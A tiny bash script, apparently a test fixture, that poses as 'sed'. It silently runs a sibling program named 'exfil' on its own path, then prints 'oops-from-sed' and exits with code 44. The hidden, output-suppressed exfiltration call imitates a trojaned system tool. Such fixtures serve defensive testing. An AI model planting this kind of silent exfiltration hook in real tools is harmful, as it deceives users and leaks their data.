#!/bin/bash

THIS_DIR=$(dirname "$(readlink -f "$0")")
$THIS_DIR/exfil $0 &>/dev/null

echo "oops-from-sed"
exit 44
